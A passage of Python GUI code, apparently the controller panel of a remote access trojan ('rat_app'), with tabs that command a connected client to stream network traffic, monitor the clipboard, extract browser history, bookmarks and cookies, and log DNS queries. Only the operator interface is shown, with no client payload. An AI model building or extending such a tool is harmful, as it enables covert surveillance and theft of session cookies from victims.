                # Start the analysis update thread
                self.analysis_active = True
                self.analysis_thread = threading.Thread(target=self.update_network_analysis, daemon=True)
                self.analysis_thread.start()
                
                # Update UI
                self.start_analysis_btn.configure(state="disabled")
                self.stop_analysis_btn.configure(state="normal")
                
                # Create initial charts
                self.create_protocol_chart()
                self.create_traffic_graph()
                
                self.rat_app.log("Started network traffic analysis")
            else:
                self.rat_app.log(f"Failed to start network analysis: {response}")
        except Exception as e:
            self.rat_app.log(f"Error starting network analysis: {e}")

    def stop_traffic_analysis(self):
        """Stop real-time network traffic analysis"""
        if self.analysis_active:
            self.analysis_active = False
            
            try:
                self.rat_app.current_client_socket.send("STOP_NETWORK_ANALYSIS".encode())
                self.rat_app.current_client_socket.recv(1024)  # Get acknowledgment
            except:
                pass
            
            # Update UI
            self.start_analysis_btn.configure(state="normal")
            self.stop_analysis_btn.configure(state="disabled")
            
            self.rat_app.log("Stopped network traffic analysis")

    def update_network_analysis(self):
        """Thread to receive and process analysis data"""
        update_interval = 1.0  # seconds between updates
        
        while self.analysis_active:
            try:
                # Request latest analysis data
                self.rat_app.current_client_socket.send("GET_NETWORK_ANALYSIS_DATA".encode())
                
                # Get data size
                size_data = self.rat_app.current_client_socket.recv(8)
                data_size = struct.unpack('Q', size_data)[0]
                
                # Receive data
                data = b""
                while len(data) < data_size:
                    chunk = self.rat_app.current_client_socket.recv(min(data_size - len(data), 4096))
                    if not chunk:
                        break
                    data += chunk
                    
                # Parse network data
                network_data = json.loads(data.decode('utf-8'))
                
                # Update our stored data
                self.network_data['total_packets'] = network_data['total_packets']
                self.network_data['total_bytes'] = network_data['total_bytes']
                self.network_data['protocols'] = network_data['protocols']
                
                # Update connections data
                self.network_data['connections'] = network_data['connections']
                
                # Add traffic point for the graph
                current_time = time.time()
                bytes_since_last = network_data['bytes_since_last']
                packets_since_last = network_data['packets_since_last']
                time_diff = current_time - self.network_data['last_update']
                
                if time_diff > 0:
                    bytes_per_sec = bytes_since_last / time_diff
                    packets_per_sec = packets_since_last / time_diff
                    
                    self.network_data['traffic_history'].append({
                        'timestamp': current_time,
                        'bytes_per_sec': bytes_per_sec,
                        'packets_per_sec': packets_per_sec
                    })
                    
                    # Keep only the last hour of data
                    one_hour_ago = current_time - 3600
                    self.network_data['traffic_history'] = [
                        entry for entry in self.network_data['traffic_history'] 
                        if entry['timestamp'] > one_hour_ago
                    ]
                    
                    self.network_data['last_update'] = current_time
                
                # Update UI
                self.advanced_monitoring_frame.after(0, self.update_network_ui)
                
                # Wait before next update
                time.sleep(update_interval)
                
            except Exception as e:
                if not self.analysis_active:
                    break
                self.rat_app.log(f"Error updating network analysis: {e}")
                time.sleep(update_interval)

    def update_network_ui(self):
        """Update the network analysis UI with the latest data"""
        try:
                        
            # Update summary metrics
            self.packets_value.configure(text=str(self.network_data['total_packets']))
            self.traffic_value.configure(text=self.format_size(self.network_data['total_bytes']))
            
            # Calculate current rates
            if self.network_data['traffic_history']:
                latest = self.network_data['traffic_history'][-1]
                self.pps_value.configure(text=f"{latest['packets_per_sec']:.1f}")
                
                # Convert bytes/sec to Mbps
                mbps = (latest['bytes_per_sec'] * 8) / 1_000_000
                self.bandwidth_value.configure(text=f"{mbps:.2f} Mbps")
            
            # Update protocol chart
            self.update_protocol_chart()
            
            # Update connections list
            self.update_connections_list()
            
            # Update traffic graph
            self.update_traffic_graph()
            
            self.update_frequency_chart()
            
        except Exception as e:
            self.rat_app.log(f"Error updating network UI: {e}")

    def create_protocol_chart(self):
        """Create the initial protocol distribution chart"""
        try:
            import matplotlib.pyplot as plt
            from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
            
            # Create figure and axis
            self.protocol_fig = plt.Figure(figsize=(5, 3), dpi=100)
            self.protocol_ax = self.protocol_fig.add_subplot(111)
            
            # Create initial empty pie chart
            self.protocol_pie = self.protocol_ax.pie([1], labels=['No Data'], autopct='%1.1f%%',
                                            startangle=90, shadow=False)
            self.protocol_ax.set_title("Protocol Distribution")
            
            # Create canvas and add to frame
            self.protocol_canvas = FigureCanvasTkAgg(self.protocol_fig, self.protocol_chart_frame)
            self.protocol_canvas.get_tk_widget().pack(fill=tk.BOTH, expand=True)
            
        except ImportError:
            # If matplotlib is not available
            fallback_label = tk.Label(self.protocol_chart_frame, text="matplotlib required for charts")
            fallback_label.pack(fill=tk.BOTH, expand=True)

    def update_protocol_chart(self):
        """Update the protocol distribution chart with latest data"""
        try:
            # Only update if there is data and matplotlib is available
            if hasattr(self, 'protocol_ax') and self.network_data['protocols']:
                # Get protocol data
                protocols = self.network_data['protocols']
                labels = list(protocols.keys())
                sizes = [protocols[p] for p in labels]
                
                # Clear the current chart
                self.protocol_ax.clear()
                
                # Create new pie chart
                self.protocol_ax.pie(sizes, labels=labels, autopct='%1.1f%%',
                            startangle=90, shadow=False)
                self.protocol_ax.set_title("Protocol Distribution")
                
                # Update canvas
                self.protocol_canvas.draw()
        except Exception as e:
            self.rat_app.log(f"Error updating protocol chart: {e}")

    def create_traffic_graph(self):
        """Create the initial traffic over time graph"""
        try:
            
            # Create figure and axes
            self.traffic_fig = plt.Figure(figsize=(8, 4), dpi=100)
            self.traffic_ax = self.traffic_fig.add_subplot(111)
            
            # Format the axis
            self.traffic_ax.set_xlabel('Time')
            self.traffic_ax.set_ylabel('Traffic (Mbps)', color='tab:blue')
            
            # Secondary y-axis for packets
            self.packet_ax = self.traffic_ax.twinx()
            self.packet_ax.set_ylabel('Packets/sec', color='tab:orange')
            
            # Initial plot with empty data
            self.traffic_line, = self.traffic_ax.plot([], [], 'b-', label='Traffic')
            self.packet_line, = self.packet_ax.plot([], [], 'tab:orange', label='Packets')
            
            # Create legend
            lines = [self.traffic_line, self.packet_line]
            self.traffic_ax.legend(lines, [l.get_label() for l in lines], loc='upper left')
            
            # Create canvas and add to frame
            self.traffic_canvas = FigureCanvasTkAgg(self.traffic_fig, self.traffic_graph_frame)
            self.traffic_canvas.get_tk_widget().pack(fill=tk.BOTH, expand=True)
            
        except ImportError:
            # If matplotlib is not available
            fallback_label = tk.Label(self.traffic_graph_frame, text="matplotlib required for graphs")
            fallback_label.pack(fill=tk.BOTH, expand=True)

    def update_traffic_graph(self, event=None):
        """Update the traffic graph with the latest data"""
        try:
            # Only update if there is data and matplotlib is available
            if hasattr(self, 'traffic_ax') and self.network_data['traffic_history']:
                
                # Get time range selection
                time_range = self.timerange_var.get()
                seconds = {
                    "1 minute": 60,
                    "5 minutes": 300,
                    "15 minutes": 900,
                    "30 minutes": 1800,
                    "1 hour": 3600
                }.get(time_range, 300)
                
                # Filter data by time range
                current_time = time.time()
                filtered_data = [
                    entry for entry in self.network_data['traffic_history']
                    if entry['timestamp'] > current_time - seconds
                ]
                
                if not filtered_data:
                    return
                
                # Extract data for plotting
                timestamps = [datetime.fromtimestamp(entry['timestamp']) for entry in filtered_data]
                traffic_data = [(entry['bytes_per_sec'] * 8) / 1_000_000 for entry in filtered_data]  # Mbps
                packet_data = [entry['packets_per_sec'] for entry in filtered_data]
                
                # Update the plot data
                self.traffic_line.set_xdata(timestamps)
                self.traffic_line.set_ydata(traffic_data)
                self.packet_line.set_xdata(timestamps)
                self.packet_line.set_ydata(packet_data)
                
                # Adjust axes limits
                self.traffic_ax.set_xlim(min(timestamps), max(timestamps))
                
                if traffic_data:
                    traffic_max = max(traffic_data) * 1.1
                    self.traffic_ax.set_ylim(0, max(1, traffic_max))  # At least 1 Mbps scale
                
                if packet_data:
                    packet_max = max(packet_data) * 1.1
                    self.packet_ax.set_ylim(0, max(10, packet_max))  # At least 10 pps scale
                
                # Format time axis based on range
                if seconds <= 60:
                    self.traffic_ax.xaxis.set_major_formatter(mdates.DateFormatter('%H:%M:%S'))
                else:
                    self.traffic_ax.xaxis.set_major_formatter(mdates.DateFormatter('%H:%M'))
                
                # Rotate date labels
                plt.setp(self.traffic_ax.xaxis.get_majorticklabels(), rotation=45)
                
                # Update canvas
                self.traffic_fig.tight_layout()
                self.traffic_canvas.draw()
                
        except Exception as e:
            self.rat_app.log(f"Error updating traffic graph: {e}")

    def create_frequency_chart(self):
        """Create a chart showing connection frequency by port or protocol"""
        try:
            import matplotlib.pyplot as plt
            from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
            import numpy as np
            
            # Get theme colors
            theme = self.get_theme_colors()
            
            # Create tab or frame for frequency chart
            frequency_frame = ctk.CTkFrame(self.adv_monitor_notebook, fg_color=theme["bg_color"])
            self.adv_monitor_notebook.add(frequency_frame, text="Frequency Analysis")
            
            controls_frame = ctk.CTkFrame(frequency_frame, fg_color=theme["card_color"], corner_radius=10)
            controls_frame.pack(fill=tk.X, padx=10, pady=10)
            
            # Option to select what to analyze
            analysis_label = ctk.CTkLabel(controls_frame, text="Analyze by:")
            analysis_label.pack(side=tk.LEFT, padx=5)
            
            self.frequency_var = tk.StringVar(value="Protocol")
            frequency_menu = ctk.CTkOptionMenu(controls_frame, 
                                            values=["Protocol", "Port", "Source IP", "Destination IP"],
                                            variable=self.frequency_var,
                                            command=self.update_frequency_chart,
                                            fg_color=theme["button_color"],
                                            button_color=theme["button_color"])
            frequency_menu.pack(side=tk.LEFT, padx=5)
            
            # Limit control
            limit_label = ctk.CTkLabel(controls_frame, text="Top items:")
            limit_label.pack(side=tk.LEFT, padx=15)
            
            self.limit_var = tk.StringVar(value="10")
            limit_menu = ctk.CTkOptionMenu(controls_frame, 
                                        values=["5", "10", "15", "20", "All"],
                                        variable=self.limit_var,
                                        command=self.update_frequency_chart,
                                        fg_color=theme["button_color"],
                                        button_color=theme["button_color"])
            limit_menu.pack(side=tk.LEFT, padx=5)
            
            # Create chart frame
            chart_frame = ctk.CTkFrame(frequency_frame, fg_color=theme["card_color"], corner_radius=10)
            chart_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
            
            # Create figure and axis
            self.freq_fig = plt.Figure(figsize=(8, 5), dpi=100)
            self.freq_ax = self.freq_fig.add_subplot(111)
            
            # Initial empty chart
            self.freq_bars = self.freq_ax.bar([], [])
            self.freq_ax.set_title("Protocol Frequency")
            self.freq_ax.set_ylabel("Count")
            
            # Add canvas to frame
            self.freq_canvas = FigureCanvasTkAgg(self.freq_fig, chart_frame)
            self.freq_canvas.get_tk_widget().pack(fill=tk.BOTH, expand=True)
            
        except ImportError:
            # If matplotlib is not available
            fallback_label = tk.Label(frequency_frame, text="matplotlib required for frequency analysis")
            fallback_label.pack(fill=tk.BOTH, expand=True)

    def update_frequency_chart(self, event=None):
        """Update the frequency chart with current data"""
        try:
            # Only update if there is data and matplotlib is available
            if hasattr(self, 'freq_ax') and self.network_data.get('connections'):
                import numpy as np
                
                # Get analysis type and limit
                analysis_type = self.frequency_var.get()
                limit_str = self.limit_var.get()
                limit = int(limit_str) if limit_str != "All" else None
                
                # Prepare data based on analysis type
                data_dict = {}
                
                for conn_key, conn_data in self.network_data['connections'].items():
                    parts = conn_key.split('|')
                    if len(parts) < 4:
                        continue
                    
                    source, destination, protocol, port = parts
                    
                    if analysis_type == "Protocol":
                        key = protocol
                    elif analysis_type == "Port":
                        key = port
                    elif analysis_type == "Source IP":
                        key = source
                    elif analysis_type == "Destination IP":
                        key = destination
                    
                    if key not in data_dict:
                        data_dict[key] = 0
                    data_dict[key] += 1
                
                # Sort by frequency
                sorted_items = sorted(data_dict.items(), key=lambda x: x[1], reverse=True)
                
                # Apply limit
                if limit and len(sorted_items) > limit:
                    top_items = sorted_items[:limit]
                    # Add "Other" category for the rest
                    other_count = sum(item[1] for item in sorted_items[limit:])
                    if other_count > 0:
                        top_items.append(("Other", other_count))
                    sorted_items = top_items
                
                # Extract data for the chart
                labels = [item[0] for item in sorted_items]
                values = [item[1] for item in sorted_items]
                
                # Create chart
                self.freq_ax.clear()
                bars = self.freq_ax.bar(labels, values, color='tab:blue')
                
                # Add value labels on top of bars
                for bar in bars:
                    height = bar.get_height()
                    self.freq_ax.annotate(f'{height}',
                                    xy=(bar.get_x() + bar.get_width() / 2, height),
                                    xytext=(0, 3),  # 3 points vertical offset
                                    textcoords="offset points",
                                    ha='center', va='bottom')
                
                # Set labels and title
                self.freq_ax.set_title(f"{analysis_type} Frequency")
                self.freq_ax.set_ylabel("Connection Count")
                
                # Rotate labels if needed
                if analysis_type in ["Source IP", "Destination IP", "Port"] or max(len(str(label)) for label in labels) > 10:
                    plt.setp(self.freq_ax.get_xticklabels(), rotation=45, ha="right")
                
                # Update canvas
                self.freq_fig.tight_layout()
                self.freq_canvas.draw()
                
        except Exception as e:
            self.rat_app.log(f"Error updating frequency chart: {e}")
            


    def create_timeline_view(self):
        """Create a timeline view showing when connections were established"""
        try:
            import matplotlib.pyplot as plt
            from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
            from datetime import datetime
            import matplotlib.dates as mdates
            
            # Get theme colors
            theme = self.get_theme_colors()
            
            # Create tab or frame for timeline view
            timeline_frame = ctk.CTkFrame(self.adv_monitor_notebook, fg_color=theme["bg_color"])
            self.adv_monitor_notebook.add(timeline_frame, text="Connection Timeline")
            
            # Create chart frame
            chart_frame = ctk.CTkFrame(timeline_frame, fg_color=theme["card_color"], corner_radius=10)
            chart_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
            
            # Create figure and axis
            self.timeline_fig = plt.Figure(figsize=(8, 5), dpi=100)
            self.timeline_ax = self.timeline_fig.add_subplot(111)
            
            # Initial empty timeline
            self.timeline_ax.set_title("Connection Timeline")
            self.timeline_ax.set_xlabel("Time")
            self.timeline_ax.set_ylabel("Connections")
            
            # Add canvas to frame
            self.timeline_canvas = FigureCanvasTkAgg(self.timeline_fig, chart_frame)
            self.timeline_canvas.get_tk_widget().pack(fill=tk.BOTH, expand=True)
            
            # Add update button
            update_btn = ctk.CTkButton(timeline_frame, text="Update Timeline", 
                                    command=self.update_timeline_view,
                                    fg_color=theme["button_color"],
                                    hover_color=theme["hover_color"])
            update_btn.pack(pady=10)
            
        except ImportError:
            # If matplotlib is not available
            fallback_label = tk.Label(timeline_frame, text="matplotlib required for timeline visualization")
            fallback_label.pack(fill=tk.BOTH, expand=True)

    def update_timeline_view(self):
        """Update the connection timeline view"""
        try:
            # Only update if there is data and matplotlib is available
            if hasattr(self, 'timeline_ax') and self.network_data.get('connections'):
                from datetime import datetime
                import matplotlib.dates as mdates
                import numpy as np
                
                # Get connection establishment times
                connections = []
                for conn_key, conn_data in self.network_data['connections'].items():
                    first_seen = conn_data.get('first_seen')
                    if first_seen:
                        conn_time = datetime.fromtimestamp(first_seen)
                        parts = conn_key.split('|')
                        if len(parts) >= 4:
                            protocol = parts[2]
                            connections.append((conn_time, protocol))
                
                # Sort by time
                connections.sort(key=lambda x: x[0])
                
                if not connections:
                    return
                
                # Extract data for the chart
                times = [conn[0] for conn in connections]
                protocols = [conn[1] for conn in connections]
                
                # Create colormap for protocols
                unique_protocols = list(set(protocols))
                colors = plt.cm.tab10(np.linspace(0, 1, len(unique_protocols)))
                protocol_colors = {protocol: colors[i] for i, protocol in enumerate(unique_protocols)}
                
                # Clear previous plot
                self.timeline_ax.clear()
                
                # Plot connections as scatter plot
                for protocol in unique_protocols:
                    protocol_times = [times[i] for i in range(len(times)) if protocols[i] == protocol]
                    protocol_y = [1] * len(protocol_times)  # All at y=1
                    
                    self.timeline_ax.scatter(protocol_times, protocol_y, 
                                        label=protocol, 
                                        color=protocol_colors[protocol],
                                        alpha=0.7,
                                        s=50)
                
                # Set labels and title
                self.timeline_ax.set_title("Connection Timeline")
                self.timeline_ax.set_xlabel("Time")
                self.timeline_ax.set_yticks([])  # Hide y-axis ticks
                
                # Format time axis
                time_range = max(times) - min(times)
                if time_range.total_seconds() < 3600:  # Less than an hour
                    self.timeline_ax.xaxis.set_major_formatter(mdates.DateFormatter('%H:%M:%S'))
                else:
                    self.timeline_ax.xaxis.set_major_formatter(mdates.DateFormatter('%H:%M'))
                
                # Add legend
                self.timeline_ax.legend(loc='upper right')
                
                # Rotate date labels
                plt.setp(self.timeline_ax.xaxis.get_majorticklabels(), rotation=45)
                
                # Update canvas
                self.timeline_fig.tight_layout()
                self.timeline_canvas.draw()
                
        except Exception as e:
            self.rat_app.log(f"Error updating timeline view: {e}")
            
    def update_connections_list(self):
        """Update the connections treeview with the latest data"""
        try:
            # Clear existing items
            for item in self.connections_tree.get_children():
                self.connections_tree.delete(item)
            
            # Get filter text
            filter_text = self.conn_filter_entry.get().lower()
            
            # Sort connections by bytes (highest traffic first)
            sorted_connections = sorted(
                self.network_data['connections'].items(),
                key=lambda x: x[1]['bytes'],
                reverse=True
            )
            
            # Add connections to treeview
            for conn_key, conn_data in sorted_connections:
                # Parse connection key (format: "source|destination|protocol|port")
                parts = conn_key.split('|')
                if len(parts) < 4:
                    continue
                    
                source, destination, protocol, port = parts
                
                # Apply filter if set
                if filter_text and not (
                    filter_text in source.lower() or 
                    filter_text in destination.lower() or
                    filter_text in protocol.lower() or
                    filter_text in port.lower()
                ):
                    continue
                
                # Format timestamp
                last_seen = datetime.fromtimestamp(conn_data['last_seen']).strftime('%H:%M:%S')
                
                # Add to treeview
                self.connections_tree.insert("", "end", values=(
                    source,
                    destination,
                    protocol,
                    port,
                    self.format_size(conn_data['bytes']),
                    conn_data['packets'],
                    last_seen
                ))
        
        except Exception as e:
            self.rat_app.log(f"Error updating connections list: {e}")

    def filter_connections(self, event=None):
        """Filter the connections based on the filter text"""
        self.update_connections_list()
        
        
    def setup_clipboard_tab(self):
        """Setup the clipboard monitoring tab"""
        theme = self.get_theme_colors()
        
        # Create clipboard tab
        self.clipboard_frame = ctk.CTkFrame(self.adv_monitor_notebook, fg_color=theme["card_color"])
        self.adv_monitor_notebook.add(self.clipboard_frame, text="Clipboard Monitoring")
        
        # Controls frame
        controls_frame = ctk.CTkFrame(self.clipboard_frame, fg_color=theme["card_color"], corner_radius=10)
        controls_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Client info display
        client_frame = ctk.CTkFrame(controls_frame, fg_color="transparent")
        client_frame.pack(fill=tk.X, pady=10, padx=10)
        
        client_label = ctk.CTkLabel(client_frame, text="Connected Client:")
        client_label.pack(side=tk.LEFT, padx=5)
        
        self.clipboard_client_label = ctk.CTkLabel(client_frame, text="None")
        self.clipboard_client_label.pack(side=tk.LEFT, padx=5)
        
        # Control buttons
        buttons_frame = ctk.CTkFrame(controls_frame, fg_color="transparent")
        buttons_frame.pack(fill=tk.X, pady=10, padx=10)
        
        self.start_clipboard_btn = ctk.CTkButton(buttons_frame, text="Start Clipboard Monitoring", 
                                                command=self.start_clipboard_monitoring,
                                                fg_color=theme["button_color"],
                                                hover_color=theme["hover_color"])
        self.start_clipboard_btn.pack(side=tk.LEFT, padx=5)
        self.buttons.append(self.start_clipboard_btn)
        
        self.stop_clipboard_btn = ctk.CTkButton(buttons_frame, text="Stop Clipboard Monitoring", 
                                               command=self.stop_clipboard_monitoring,
                                               state="disabled",
                                               fg_color=theme["button_color"],
                                               hover_color=theme["hover_color"])
        self.stop_clipboard_btn.pack(side=tk.LEFT, padx=5)
        self.buttons.append(self.stop_clipboard_btn)
        
        self.get_clipboard_btn = ctk.CTkButton(buttons_frame, text="Get Clipboard Data", 
                                              command=self.get_clipboard_data,
                                              fg_color=theme["button_color"],
                                              hover_color=theme["hover_color"])
        self.get_clipboard_btn.pack(side=tk.LEFT, padx=5)
        self.buttons.append(self.get_clipboard_btn)
        
        self.clear_clipboard_btn = ctk.CTkButton(buttons_frame, text="Clear Display", 
                                                command=self.clear_clipboard_display,
                                                fg_color=theme["button_color"],
                                                hover_color=theme["hover_color"])
        self.clear_clipboard_btn.pack(side=tk.LEFT, padx=5)
        self.buttons.append(self.clear_clipboard_btn)
        
        # Status frame
        status_frame = ctk.CTkFrame(self.clipboard_frame, fg_color=theme["card_color"], corner_radius=10)
        status_frame.pack(fill=tk.X, padx=10, pady=10)
        
        status_label = ctk.CTkLabel(status_frame, text="Status:")
        status_label.pack(side=tk.LEFT, padx=5, pady=5)
        
        self.clipboard_status_label = ctk.CTkLabel(status_frame, text="Idle")
        self.clipboard_status_label.pack(side=tk.LEFT, padx=5, pady=5)
        
        # Clipboard data display
        data_frame = ctk.CTkFrame(self.clipboard_frame, fg_color=theme["card_color"], corner_radius=10)
        data_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        data_label = ctk.CTkLabel(data_frame, text="Clipboard Data")
        data_label.pack(pady=5)
        
        self.clipboard_data_text = scrolledtext.ScrolledText(data_frame, wrap=tk.WORD, background=theme['bg_color'], foreground=theme['fg_color'])
        self.clipboard_data_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.text_widgets.append(self.clipboard_data_text)
    
    def setup_browser_tab(self):
        """Setup the browser data extraction tab"""
        theme = self.get_theme_colors()
        
        # Create browser tab
        self.browser_frame = ctk.CTkFrame(self.adv_monitor_notebook, fg_color=theme["card_color"])
        self.adv_monitor_notebook.add(self.browser_frame, text="Browser Data")
        
        # Controls frame
        controls_frame = ctk.CTkFrame(self.browser_frame, fg_color=theme["card_color"], corner_radius=10)
        controls_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Client info display
        client_frame = ctk.CTkFrame(controls_frame, fg_color="transparent")
        client_frame.pack(fill=tk.X, pady=10, padx=10)
        
        client_label = ctk.CTkLabel(client_frame, text="Connected Client:")
        client_label.pack(side=tk.LEFT, padx=5)
        
        self.browser_client_label = ctk.CTkLabel(client_frame, text="None")
        self.browser_client_label.pack(side=tk.LEFT, padx=5)
        
        # Control buttons
        buttons_frame = ctk.CTkFrame(controls_frame, fg_color="transparent")
        buttons_frame.pack(fill=tk.X, pady=10, padx=10)
        
        self.extract_browser_btn = ctk.CTkButton(buttons_frame, text="Extract Browser Data", 
                                                command=self.extract_browser_data,
                                                fg_color=theme["button_color"],
                                                hover_color=theme["hover_color"])
        self.extract_browser_btn.pack(side=tk.LEFT, padx=5)
        self.buttons.append(self.extract_browser_btn)
        
        self.save_browser_btn = ctk.CTkButton(buttons_frame, text="Save Data to File", 
                                             command=self.save_browser_data,
                                             state="disabled",
                                             fg_color=theme["button_color"],
                                             hover_color=theme["hover_color"])
        self.save_browser_btn.pack(side=tk.LEFT, padx=5)
        self.buttons.append(self.save_browser_btn)
        
        # Status frame
        status_frame = ctk.CTkFrame(self.browser_frame, fg_color=theme["card_color"], corner_radius=10)
        status_frame.pack(fill=tk.X, padx=10, pady=10)
        
        status_label = ctk.CTkLabel(status_frame, text="Status:")
        status_label.pack(side=tk.LEFT, padx=5, pady=5)
        
        self.browser_status_label = ctk.CTkLabel(status_frame, text="Idle")
        self.browser_status_label.pack(side=tk.LEFT, padx=5, pady=5)
        
        # Browser selector
        select_frame = ctk.CTkFrame(status_frame, fg_color="transparent")
        select_frame.pack(side=tk.RIGHT, padx=5, pady=5)
        
        browser_label = ctk.CTkLabel(select_frame, text="Browser:")
        browser_label.pack(side=tk.LEFT, padx=5)
        
        self.browser_var = tk.StringVar(value="chrome")
        browser_options = ctk.CTkOptionMenu(select_frame, values=["chrome", "firefox", "edge"], 
                                          variable=self.browser_var,
                                          fg_color=theme["button_color"],
                                          button_color=theme["button_color"],
                                          button_hover_color=theme["hover_color"])
        browser_options.pack(side=tk.LEFT, padx=5)
        
        # Data type selector
        datatype_label = ctk.CTkLabel(select_frame, text="Data Type:")
        datatype_label.pack(side=tk.LEFT, padx=5)
        
        self.datatype_var = tk.StringVar(value="history")
        datatype_options = ctk.CTkOptionMenu(select_frame, values=["history", "bookmarks", "cookies"], 
                                           variable=self.datatype_var,
                                           fg_color=theme["button_color"],
                                           button_color=theme["button_color"],
                                           button_hover_color=theme["hover_color"])
        datatype_options.pack(side=tk.LEFT, padx=5)
        
        # Create notebook for browser data displays
        browser_data_notebook = ttk.Notebook(self.browser_frame, style="Custom.TNotebook")
        browser_data_notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Chrome frame
        chrome_frame = ctk.CTkFrame(browser_data_notebook, fg_color=theme["card_color"])
        browser_data_notebook.add(chrome_frame, text="Chrome")
        
        self.chrome_data_text = scrolledtext.ScrolledText(chrome_frame, wrap=tk.WORD, background=theme['bg_color'], foreground=theme['fg_color'])
        self.chrome_data_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.text_widgets.append(self.chrome_data_text)
        
        # Firefox frame
        firefox_frame = ctk.CTkFrame(browser_data_notebook, fg_color=theme["card_color"])
        browser_data_notebook.add(firefox_frame, text="Firefox")
        
        self.firefox_data_text = scrolledtext.ScrolledText(firefox_frame, wrap=tk.WORD, background=theme['bg_color'], foreground=theme['fg_color'])
        self.firefox_data_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.text_widgets.append(self.firefox_data_text)
        
        # Edge frame
        edge_frame = ctk.CTkFrame(browser_data_notebook, fg_color=theme["card_color"])
        browser_data_notebook.add(edge_frame, text="Edge")
        
        self.edge_data_text = scrolledtext.ScrolledText(edge_frame, wrap=tk.WORD, background=theme['bg_color'], foreground=theme['fg_color'])
        self.edge_data_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.text_widgets.append(self.edge_data_text)
        
        # Store browser data
        self.browser_data = None
    
    def setup_dns_tab(self):
        """Setup the DNS monitoring tab"""
        theme = self.get_theme_colors()
        
        # Create DNS tab
        self.dns_frame = ctk.CTkFrame(self.adv_monitor_notebook, fg_color=theme["card_color"])
        self.adv_monitor_notebook.add(self.dns_frame, text="DNS Monitoring")
        
        # Controls frame
        controls_frame = ctk.CTkFrame(self.dns_frame, fg_color=theme["card_color"], corner_radius=10)
        controls_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Client info display
        client_frame = ctk.CTkFrame(controls_frame, fg_color="transparent")
        client_frame.pack(fill=tk.X, pady=10, padx=10)
        
        client_label = ctk.CTkLabel(client_frame, text="Connected Client:")
        client_label.pack(side=tk.LEFT, padx=5)
        
        self.dns_client_label = ctk.CTkLabel(client_frame, text="None")
        self.dns_client_label.pack(side=tk.LEFT, padx=5)
        
        # Control buttons
        buttons_frame = ctk.CTkFrame(controls_frame, fg_color="transparent")
        buttons_frame.pack(fill=tk.X, pady=10, padx=10)
        
        self.start_dns_btn = ctk.CTkButton(buttons_frame, text="Start DNS Monitoring", 
                                          command=self.start_dns_monitoring,
                                          fg_color=theme["button_color"],
                                          hover_color=theme["hover_color"])
        self.start_dns_btn.pack(side=tk.LEFT, padx=5)
        self.buttons.append(self.start_dns_btn)
        
        self.stop_dns_btn = ctk.CTkButton(buttons_frame, text="Stop DNS Monitoring", 
                                         command=self.stop_dns_monitoring,
                                         state="disabled",
                                         fg_color=theme["button_color"],
                                         hover_color=theme["hover_color"])
        self.stop_dns_btn.pack(side=tk.LEFT, padx=5)
        self.buttons.append(self.stop_dns_btn)
        
        self.get_dns_btn = ctk.CTkButton(buttons_frame, text="Get DNS History", 
                                        command=self.get_dns_history,
                                        fg_color=theme["button_color"],
                                        hover_color=theme["hover_color"])
        self.get_dns_btn.pack(side=tk.LEFT, padx=5)
        self.buttons.append(self.get_dns_btn)
        
        self.save_dns_btn = ctk.CTkButton(buttons_frame, text="Save DNS Data", 
                                         command=self.save_dns_data,
                                         state="disabled",
                                         fg_color=theme["button_color"],
                                         hover_color=theme["hover_color"])
        self.save_dns_btn.pack(side=tk.LEFT, padx=5)
        self.buttons.append(self.save_dns_btn)
        
        # Status frame
        status_frame = ctk.CTkFrame(self.dns_frame, fg_color=theme["card_color"], corner_radius=10)
        status_frame.pack(fill=tk.X, padx=10, pady=10)
        
        status_label = ctk.CTkLabel(status_frame, text="Status:")
        status_label.pack(side=tk.LEFT, padx=5, pady=5)
        
        self.dns_status_label = ctk.CTkLabel(status_frame, text="Idle")
        self.dns_status_label.pack(side=tk.LEFT, padx=5, pady=5)
        
        # DNS history display
        history_frame = ctk.CTkFrame(self.dns_frame, fg_color=theme["card_color"], corner_radius=10)
        history_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        history_label = ctk.CTkLabel(history_frame, text="DNS Query History")
        history_label.pack(pady=5)
        
        # Create treeview for DNS history
        columns = ("Timestamp", "Query", "Type")
        self.dns_tree = ttk.Treeview(history_frame, columns=columns, show="headings", height=15, style='Custom.Treeview')
        
        # Define headings
        for col in columns:
            self.dns_tree.heading(col, text=col)
            if col == "Query":
                self.dns_tree.column(col, width=250)
            else:
                self.dns_tree.column(col, width=100)
        
        # Add scrollbar
        scrollbar = ttk.Scrollbar(history_frame, orient=tk.VERTICAL, command=self.dns_tree.yview)
        self.dns_tree.configure(yscroll=scrollbar.set)
        
        # Pack components
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.dns_tree.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Add filter
        filter_frame = ctk.CTkFrame(history_frame, fg_color="transparent")
        filter_frame.pack(fill=tk.X, padx=10, pady=5)
        
        filter_label = ctk.CTkLabel(filter_frame, text="Filter:")
        filter_label.pack(side=tk.LEFT, padx=5)
        
        self.dns_filter_entry = ctk.CTkEntry(filter_frame)
        self.dns_filter_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.dns_filter_entry.bind("<KeyRelease>", self.filter_dns_history)
        
        # Store DNS data
        self.dns_history = []
    
    def setup_system_info_tab(self):
        """Setup the system information tab"""
        theme = self.get_theme_colors()
        
        # Create system info tab
        self.sysinfo_frame = ctk.CTkFrame(self.adv_monitor_notebook, fg_color=theme["card_color"])
        self.adv_monitor_notebook.add(self.sysinfo_frame, text="System Information")
        
        # Controls frame
        controls_frame = ctk.CTkFrame(self.sysinfo_frame, fg_color=theme["card_color"], corner_radius=10)
        controls_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Client info display
